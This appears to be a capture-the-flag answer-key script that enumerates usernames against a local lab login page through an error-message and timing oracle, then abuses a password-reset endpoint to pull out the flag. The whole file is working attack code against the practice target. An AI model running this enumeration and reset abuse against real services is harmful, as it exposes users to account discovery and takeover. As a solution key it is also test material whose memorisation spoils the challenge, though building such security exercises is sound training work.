#!/usr/bin/env python3
"""Operation 01 reference solver — IQ enumerates past Mute's blackout.
Reads the SAME wordlist a challenger is handed (wordlists/callsigns.txt) —
this is the answer-key run of the exact recon a player performs by hand.
Usage: python3 op1.py [base_url]   (default http://localhost:8000)"""
import sys, os, time, requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000").rstrip("/")
WORDLIST = os.path.join(os.path.dirname(__file__), "..", "wordlists", "callsigns.txt")

def main():
    with open(WORDLIST) as f:
        callsigns = [line.strip() for line in f if line.strip()]
    print(f"[*] Enumerating {len(callsigns)} candidates from {WORDLIST} against {BASE}/op1\n")
    valid = []
    for u in callsigns:
        t0 = time.perf_counter()
        r = requests.post(f"{BASE}/op1/login", data={"username": u, "password": "x"})
        dt = (time.perf_counter() - t0) * 1000
        if "Incorrect password" in r.text:
            valid.append(u); print(f"  [VALID] {u:<14} ({dt:5.0f} ms)  <- slow = timing oracle")
        else:
            print(f"  [ --- ] {u:<14} ({dt:5.0f} ms)")
    print(f"\n[*] Valid: {', '.join(valid)}\n[*] Probing recovery oracle...\n")
    for u in valid:
        r = requests.post(f"{BASE}/op1/reset", data={"username": u})
        if "R6S{" in r.text:
            flag = "R6S{" + r.text.split("R6S{",1)[1].split("}",1)[0] + "}"
            print(f"  [ADMIN] {u} -> {flag}\n\n[+] OPERATION 01 FLAG: {flag}")
            print("[+] Operation 02 is now unlocked at Command.")
            return
        print(f"  [user ] {u} -> recovery dispatched (no flag)")

if __name__ == "__main__":
    main()
